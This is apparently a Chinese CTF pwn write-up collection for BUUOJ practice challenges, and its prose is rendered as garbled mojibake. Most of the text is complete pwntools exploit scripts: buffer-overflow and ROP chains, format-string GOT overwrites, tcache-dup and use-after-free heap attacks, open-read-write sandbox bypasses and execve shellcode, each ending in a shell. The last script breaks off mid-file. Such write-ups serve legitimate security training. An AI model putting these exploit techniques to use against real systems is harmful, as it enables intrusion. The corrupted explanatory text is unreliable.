å…¶ä¸­openå‡½æ•°æ‰§è¡Œåï¼Œç”±äºæ˜¯æ‰“å¼€äº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå…¶è¿”å›çš„fdå°±æ˜¯3ï¼Œæ‰€ä»¥åé¢è·Ÿç€çš„readçš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿä¸º3ã€‚ expfrom pwn import * import time local_file = './orw' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',26224) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() bss = 0x804A128 - 0x30 payload= asm(shellcraft.open(\"./flag\")) payload += asm(shellcraft.read(3,bss,0x30)) payload += asm(shellcraft.write(1,bss,0x30)) sl(payload) itr() V&amp;N2020 å…¬å¼€èµ›warmupåˆ†æå¼€å¯äº†æ²™ç›’ï¼Œä½¿ç”¨orwè·å–flagå³å¯ã€‚ Here is my gift: 0x7f411f85c9c0 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x07 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001 if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024 A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000 if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020 A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010 if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL å…¶ä¸­ï¼Œè¿™é¢˜å› ä¸ºåªæœ‰0x10çš„æº¢å‡ºç©ºé—´ï¼ŒçŒ›çš„ä¸€çœ‹éœ€è¦æ ˆè¿ç§»ï¼Œä½†æ˜¯ä¼šå‘ç°ä¸çŸ¥é“å¾€å“ªé‡Œè¿ç§»ã€‚çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰çŸ¥é“ï¼Œç”±äºç¬¬ä¸€ä¸ªæ ˆç©ºé—´è¾ƒå¤§ï¼Œä¸”ä¸ç¬¬äºŒä¸ªå¯ä»¥æº¢å‡ºçš„æ ˆæ˜¯ç´§é‚»çš„ã€‚ç„¶åï¼Œå°±å¯ä»¥åœ¨æº¢å‡ºæ—¶è¦†ç›–ä¸€ä¸‹è¿”å›åœ°å€ï¼Œè¦†ç›–ä¸ºretï¼Œè¿™æ ·å°±å¯ä»¥å¤šä¸€ä¸ªretï¼Œä»è€Œæ¥ç€æ‰§è¡Œä¸Šä¸€ä¸ªæ ˆå¸§bufé‡Œé¢æ„é€ çš„ropé“¾ã€‚ å¹¶ä¸”åœ¨orwä¸­ï¼Œopenå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ—¶ä¸€ä¸ªæŒ‡é’ˆåœ°å€(*filename)ï¼Œæ‰€ä»¥éœ€è¦å…ˆreadä¸€ä¸‹flagçš„æ–‡ä»¶ååˆ°ä¸€ä¸ªbufå½“ä¸­ï¼Œç„¶åå†è¿›è¡Œorwã€‚ Bufçš„å¯»æ‰¾ï¼šåœ¨libcä¸­æ‰¾ä¸€ä¸ªæ²¡æœ‰ç”¨åˆ°çš„åœ°å€æ®µå³å¯ã€‚æ¯”å¦‚__free_hook expfrom pwn import * import time local_file = './vn_pwn_warmup' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27585) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ru('0x') libc_base = int(r(12),16) - libc.sym['puts'] info_addr('libc_base',libc_base) pop_rdi = 0x0000000000021102 + libc_base pop_rsi = 0x00000000000202e8 + libc_base pop_rdx = 0x0000000000001b92 + libc_base open = libc_base+libc.sym['open'] read = libc_base+libc.sym['read'] puts = libc_base+libc.sym['puts'] buf = libc_base+libc.sym['__free_hook'] payload = flat([ pop_rdi,0,pop_rsi,buf,pop_rdx,8,read, pop_rdi,buf,pop_rsi,0,pop_rdx,0,open, pop_rdi,3,pop_rsi,buf,pop_rdx,0x30,read, pop_rdi,buf,puts ]) sa(':',payload) # debug() ret = libc_base + 0x0000000000000937 payload = 'a' * 0x78 + p64(ret) sa('?',payload) sleep(1) # debug() s('./flag\\x00\\x00') itr() picoctf_2018_buffer overflow 1ç®€å•çš„æ ˆæº¢å‡ºï¼Œä¸”å­˜åœ¨åé—¨ã€‚ expfrom pwn import * import time local_file = './PicoCTF_2018_buffer_overflow_1' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29988) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() win = 0x080485CB offset = 0x28 + 0x4 payload = 'a'*offset + p32(win) sa(':',payload) itr() picoctf_2018_buffer overflow 2ç±»ä¼¼ä¸Šé¢˜ï¼Œè€ƒä¸ªæ§åˆ¶ä¼ å‚ã€‚ expfrom pwn import * import time local_file = './PicoCTF_2018_buffer_overflow_2' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29988) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() win = 0x80485CB offset = 0x6c + 0x4 payload = 'a'*offset + p32(win) + p32(0xDEADBEEF) + p32(0xDEADBEEF) + p32(0xDEADC0DE) s(payload) axb_2019_fmt3232ä½çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€ƒçš„æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œå› ä¸ºæ˜¯32ä½pwntoolsçš„fmtstr_payloadæ˜¯ååˆ†å¥½ç”¨çš„ã€‚ expfrom pwn import * import time local_file = './axb_2019_fmt32' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29147) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() printf_got = 0x804A014 payload = \"%9$sA\" + p32(0x804A014) sla('me:',payload) ru('Repeater:') printf_got = uu32(r(4)) libc_base = printf_got - 0x049020 info_addr('libc_base',libc_base) offset = 8 rce = libc_base + 0x3a80c info_addr('rec',rce) payload = 'a' + fmtstr_payload(offset,&#123;0x804A014:rce&#125;,write_size = \"byte\",numbwritten = 10) sla('me:',payload) itr() pwnable_startåˆ†æ32ä½ï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œä½œè€…è‡ªå·±æ±‡ç¼–å†™çš„ç¨‹åºã€‚åˆ†ææ±‡ç¼–ä»¥åå¯ä»¥è®¤ä¸ºå°±æ˜¯ï¼š write(1,esp,20) read(0,esp,60) ååˆ†æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯éš¾ç‚¹åœ¨shellcodeæ‘†ä¸Šæ ˆä»¥åï¼Œå¦‚ä½•è·³è½¬è¿‡å»æ‰§è¡Œã€‚ åˆ©ç”¨æ€è·¯ï¼š åˆ©ç”¨æ§åˆ¶eipï¼Œè¿”å›wirteå¤„ï¼Œæ³„æ¼ä¸€ä¸‹æ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºespçš„åœ°å€ æ‘†shellcodeä¸Šæ ˆï¼Œæ§åˆ¶å¥½eip expfrom pwn import * import time local_file = './start' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',27834) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() # debug() payload = 'a' * 0x14 + p32(0x08048087) sa(\":\",payload) new_esp = uu32(r(4)) - 4 addr_shellcode = new_esp + 0x14 + 4 info_addr('new esp',new_esp) shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\" shellcode += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\" shellcode += \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\" shellcode += \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\" s('a' * 0x14 + p32(addr_shellcode) + shellcode) itr() Shell code ç½‘ä¸Šä¸€æ‰¾æœ‰å¾ˆå¤šï¼Œæ‰¾åˆ°ä¸€ä¸ªåˆé€‚å­—èŠ‚é™åˆ¶ï¼Œä¸”å¯ä»¥æ‰§è¡Œçš„å³å¯ã€‚ inndy_ropåšæ³•è·Ÿ cmcc_simpleropåŸºæœ¬ä¸€æ ·ï¼Œé™¤äº†åç§»ã€‚ 32ä½ä¸‹ï¼Œsys_execve(&quot;sh&quot;, 0, 0, 0) è¡Œä¸é€šã€‚ï¼ˆä¸Šæ¥æµ‹è¯•è¿™ä¸ªï¼Œæµ‹è¯•ä¸€é˜µå­ï¼‰ BJDCTF 2nd secretåˆ†ææ…¢æ…¢åˆ†æå¯ä»¥å‘ç°ä¸€ä¸ªæº¢å‡ºç‚¹ï¼Œä¸”åˆ©ç”¨æ­¤å¤„åªæ˜¯å¯ä»¥åšåˆ°ä»»æ„åœ°å€çš„æ•°æ®å‡1ã€‚ ç„¶åæƒ³åˆ°å¯ä»¥åœ¨gotè¡¨å¤„ä¸‹æ‰‹ï¼Œå…¶ä¸­printfã€systemå‡½æ•°åœ¨ç¨‹åºè¾¾åˆ°ä¸€å®šæ¡ä»¶æ‰ä¼šè¿è¡Œã€‚æ‰€ä»¥å…¶gotå¤„çš„å€¼æ˜¯ç‰¹å®šçš„ï¼Œå¹¶ä¸”æ˜¯ç›¸è¿‘çš„ã€‚ å¦‚å›¾æ‰€ç¤ºï¼Œç›¸å·®10ã€‚ç„¶ååˆ©ç”¨åŸæ¥çš„æº¢å‡ºç‚¹ï¼Œæ”¾å…¥printfçš„gotè¡¨åœ°å€ï¼Œè®©å…¶å‡10æ¬¡1ï¼Œä¹Ÿå°±æ˜¯ç­”å¯¹10æ¬¡serectåï¼Œè®©ç¨‹åºèµ°å‘ç»“æŸå¤„ï¼Œè°ƒç”¨printfã€‚å…¶printfçš„bufæ‰“å°çš„æ˜¯nameï¼Œè¿™ä¸ªæ˜¯å¯æ§çš„ï¼Œå†™æˆ/bin/sh\\x00å³å¯ã€‚ expfrom pwn import * import time local_file = './secret' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29635) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() payload = '/bin/sh\\x00' + \"\\x00\" * 8 + p64(elf.got['printf'])[:5] #æ­¤å¤„payload å› ä¸ºreadé‚£é‡Œè¯»çš„æ•°æ®å¤§å°é™åˆ¶ï¼Œéœ€è¦è°ƒæ•´ä¸€ä¸‹payloadçš„é•¿åº¦ã€‚ # debug() sla(\"What's your name?\",payload) answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63] for i in range(len(answer)): print(answer[i]) sa(\"Secret\",str(answer[i])) sla(\"Secret\",'1') itr() ciscn_2019_es_1åˆ†æ64ä½ï¼Œubuntu 18. å­˜åœ¨ UAFï¼Œååˆ†ç®€å•çš„tcache dupæ”»å‡»ã€‚ expfrom pwn import * import time local_file = './ciscn_2019_es_1' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',29639) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] rce18 = [0x4f2c5,0x4f322,0x10a38c] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): gdb.attach(io) pause() def add(size,name,call): sla('ice:','1') sla('size',str(size)) sa('name',str(name)) sa('call',str(call)) def show(idx): sla('ice','2') sla('dex',str(idx)) def call(idx): sla('ice','3') sla('dex',str(idx)) add(0x500,'chumen77','chumen77') #0 add(0x80,'chumen77','chumen77') #1 # debug() call(0) show(0) ru('name:\\n') libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc',libc_base) #get libc add(0x510-0x20-0x10,'chumen77','chumen77') #2 add(0x20,'chumen77','chumen77') #3 call(3) call(3) free_hook = libc_base + 0x3ed8e8 add(0x20,p64(free_hook),p64(free_hook)) #4 add(0x20,p64(free_hook),p64(free_hook)) #5 rec = rce18[1] + libc_base add(0x20,p64(rec),p64(rec)) call(1) itr() ciscn_2019_s_4åˆ†æint vul() &#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); read(0, &amp;s, 0x30u); printf(\"Hello, %s\\n\", &amp;s); read(0, &amp;s, 0x30u); return printf(\"Hello, %s\\n\", &amp;s); &#125; å­˜åœ¨æ ˆæº¢å‡ºï¼Œæº¢å‡º8ä¸ªå­—èŠ‚ï¼Œè€ƒè™‘æ ˆè½¬ç§»ã€‚ åœ¨å¡«å……bufï¼Œ %s åœ¨32ä½ç”¨äºæ³„æ¼æ ˆä¸Šçš„ä¿¡æ¯ã€‚ æ‰€ä»¥å¯ä»¥è€ƒè™‘æ³„æ¼å¤„æ ˆåœ°å€ï¼Œlibcåœ°å€ã€‚ä»è€Œç®—å‡ºbufçš„baseä¸libc baseã€‚ é¦–å…ˆå¯ä»¥æ˜ç¡®ä¸€ç‚¹å¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼Œç¬¬ä¸€ä¸‹è€ƒè™‘ç›´æ¥è¦†ç›–ä¸ºone_gadget æœ¬åœ°é€šè¿œç¨‹ä¸é€šã€‚ ç„¶åå°±è€ƒè™‘ç”¨æ ˆè½¬ç§»åˆ°bufä¸Šæ¥è·å–shellã€‚ expfrom pwn import * import time local_file = './ciscn_s_4' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',26932) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() payload = 'a' * (0x28 - 1 ) + 'b' sa('name',payload) ru(\"b\") buf_base = uu32(r(4)) - 0x38 r(4) libc_base = uu32(r(4)) - 0x1fb9b0 info_addr('stack',buf_base) info_addr('libc',libc_base) payload = p32(0x8048450) + p32(elf.plt['system']) + p32(0x8048450) + p32(buf_base+16) + '/bin/sh\\x00' payload = payload.ljust((0x30-4-4-8),'b') + p32(buf_base) *3+ p32(0x80485FD) s(payload) itr() ciscn_2019_final_2åˆ†æç¨‹åºå¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿå¾ˆç»†èŠ‚ï¼Œç”±äºè‡ªå·±çš„é€†å‘èƒ½åŠ›æœ‰ç‚¹å·®ï¼Œæ²¡æœ‰æ³¨æ„éƒ¨åˆ†ç»†èŠ‚ï¼Œé€ æˆæ„é€ å †å—ï¼Œè¿›è¡Œleakå’Œæ”¹å†™æ—¶ï¼Œé€ æˆè¾ƒå¤§çš„å›°éš¾å’Œè¿·æƒ‘ã€‚ å¼€å¯äº†æ²™ç›’ä¸èƒ½get shellï¼š # line CODE JT JF K # ================================= # 0000: 0x20 0x00 0x00 0x00000004 A = arch # 0001: 0x15 0x00 0x05 0xc000003e if (A != ARCH_X86_64) goto 0007 # 0002: 0x20 0x00 0x00 0x00000000 A = sys_number # 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 # 0004: 0x15 0x00 0x02 0xffffffff if (A != 0xffffffff) goto 0007 # 0005: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0007 # 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW # 0007: 0x06 0x00 0x00 0x00000000 return KILL æ¼æ´ç‚¹ UAF æ¯”å¦‚ï¼š ç¨‹åºå¤„ï¼šaddå‡½æ•°ï¼šint *v0; // rbx __int16 v1; // ax v0 = (int *)int_pt; *v0 = get_atoi(); *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt; v1 = get_atoi(); *(_WORD *)short_pt = v1; *((_WORD *)short_pt + 4) = *(_WORD *)short_pt; å¼€å§‹å¯¹æ•°æ®ç±»å‹çš„å¤§å°æ²¡æœ‰æ³¨æ„ï¼Œè¿™å‡ å¤„å†³å®šç€ intå‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š4å­—èŠ‚çš„æ•°æ® short int å‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š2å­—èŠ‚çš„æ•°æ® showå‡½æ•°ï¼šif ( v2 == 1 &amp;&amp; int_pt ) printf(\"your int type inode number :%d\\n\", *(unsigned int *)int_pt); if ( v2 == 2 &amp;&amp; short_pt ) printf(\"your short type inode number :%d\\n\", (unsigned int)*(signed __int16 *)short_pt); æ„å‘³ç€leakæ—¶ä¹Ÿæ˜¯åªèƒ½æ³„æ¼å‡ºéƒ¨åˆ†çš„å­—èŠ‚ï¼Œå¢åŠ åœ¨åˆ©ç”¨æ—¶çš„éš¾åº¦ï¼Œéœ€è¦åˆ©ç”¨åˆé€‚çš„å †å—è¿›è¡Œæ”»å‡»ï¼Œå…¶åˆé€‚æ˜¯æŒ‡ä¸Šé¢æœ‰æ®‹ç•™åˆé€‚çš„æ•°æ®ï¼Œç„¶åæ”¹æœ«å°¾å‡ ä¸ªå­—èŠ‚ã€‚ é¢„å¤‡çŸ¥è¯†scanfå‡½æ•°æ˜¯ä»stdinä¸­è¯»å–æ•°æ®ï¼Œä¸”åœ¨__IO_2_stdio_ çš„ioç»“æ„ä½“å­˜åœ¨ä¸€ä¸ª_filenoçš„æ ‡è¯†ä½ï¼Œé»˜è®¤å€¼æ˜¯0ï¼Œè‹¥å°†å…¶æ”¹æˆå…¶ä»–çš„æ–‡ä»¶å·ï¼Œè°ƒç”¨scanfå‡½æ•°åœ¨è·å–æ—¶ï¼Œå°±ä¼šè·å–å¯¹åº”æ–‡ä»¶ã€‚ éš¾ç‚¹ ç¨‹åºåªè®©ä½ åˆ†é…0x30æˆ–è€…0x20çš„å †å—ï¼Œå¦‚ä½•ä¼ªé€ å‡ºä¸€ä¸ªè‡³å°‘0x90çš„å †å—ï¼Œå¦‚ä½•é‡Šæ”¾åï¼Œæ¥æ³„æ¼libcã€‚ æ³„æ¼å‡ºæ¥çš„æ•°æ®ä¸æ˜¯å®Œæ•´çš„ï¼Œå¯å†™æ—¶åªèƒ½å†™ä¸Š2ã€4å­—èŠ‚ expfrom pwn import * import time local_file = './ciscn_final_2' local_libc = '/lib/x86_64-linux-gnu/libc.so.6' remote_libc = local_libc # './libc.so.6' context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote('node3.buuoj.cn',25252) libc = ELF(remote_libc) elf = ELF(local_file) context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(type,number): sla('&gt;','1') sla('&gt;',str(type)) sla(\":\",str(number)) def free(type): sla('&gt;','2') sla('&gt;',str(type)) def show(type): sla('&gt;','3') sla('&gt;',str(type)) def leave(): sla('&gt;','4') # sa('?',str(mes)) add(1,1) free(1) #leave chunk 0 add(2,2) add(2,2) add(2,2) # 0x90 #ready to dup add(2,2) free(2) add(1,1) # get chunk0 free(2) #leak heap show(2) ru('number :') chunk0_addr_word = int(ru('\\n')) - 0xa0 info_addr('chunk0_addr',chunk0_addr_word) add(2,chunk0_addr_word) add(2,chunk0_addr_word) add(2,0x91) #fake unsortbin chunk #full tache bins for i in range(7): free(1) add(2,2) #leak libc free(1) show(1) ru('number :') stdin_fillno = int(ru('\\n')) - 0x2a0 + 0x70 info_addr('stdin_fillno',stdin_fillno) #ready to attack stdin_fillno ,use taeche dup add(1,stdin_fillno) add(1,stdin_fillno) free(1) add(2,stdin_fillno) free(1) #leak contains libc's heap show(1) ru('number :') chunk1_addr_dword = int(ru('\\n')) - 0x30 info_addr('chunk1_addr_dword',chunk1_addr_dword) #change the 0x30bins chains add(1,chunk1_addr_dword) add(1,chunk1_addr_dword) add(1,stdin_fillno) #attck the fileno add(1,666) leave() itr() æ¸£æ¸£è‹±æ–‡æ³¨é‡Šï¼Œå…ˆä¸æ”¹äº†ã€‚æ„Ÿè§‰è¿˜æ˜¯æŒºä¸å®¹æ˜“åšçš„é¢˜ï¼Œå †å—å¦‚ä½•æ„é€ æƒ³äº†è€ä¹…ã€‚åˆ°åˆ«çš„å¸ˆå‚…é‚£é‡Œï¼Œå½’ç±»ä¸ºç®€å•é¢˜ã€‚å¤ªèœäº†å¤ªèœäº†ï¼ŒåŸºç¡€è¿˜ä¸æ˜¯å¾ˆå¥½ã€‚ pwnable_hacknoteåˆ†æç®€å•çš„uaf å‘ç‚¹(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]); æ­¤å¤„åœ¨æ”¹å®Œptr[v1]ä¸ºsystemä»¥åï¼Œå…¶å‚æ•°çš„æŒ‡é’ˆæ˜¯ä»è¿™ä¸ªå †å—å¼€å§‹çš„è¦æå‰è¿›è¡Œæˆªæ–­ã€‚ system(p32(system) + '||sh') system(p32(system) + ';sh;') expfrom pwn import * import time local_file = './hacknote' context.log_level = 'debug' debug = 1 if debug: io = process(local_file) else: io = remote('node3.buuoj.cn',27225) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = ['tmux','neww'] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','1') sla('size',str(size)) sa('Content',str(data)) def free(idx): sla('choice','2') sla('dex',str(idx)) def show(idx): sla('choice','3') sla('dex',str(idx)) add(0x20,'bbbb') add(0x20,'bbbb') free(0) free(1) add(8,p32(0x0804862B) + p32(elf.got['__libc_start_main'])) show(0) r() libc_base = uu32(r(4)) - 0x18540 info_addr('base',libc_base) free(2) system = 0x0003ada0 + libc_base add(8,p32(system) + '||sh') show(0) itr() Buuè¿œç¨‹æ‰“ä¸é€šã€‚ã€‚ hitcontraining_heapcreatoråˆ†æEditå‡½æ•°å¤„ï¼Œæ•…æ„å¯ä»¥å¤šå†™å‡ºä¸€ä¸ªå­—èŠ‚ã€‚ off by one expfrom pwn import * import time local_file = './heapcreator' context.log_level = 'debug' elf = ELF(local_file) debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26646) libc = elf.libc # remote_libc = '.' # './libc.so.6' # libc = ELF(remote_libc) context.arch = elf.arch context.terminal = ['tmux','neww'] 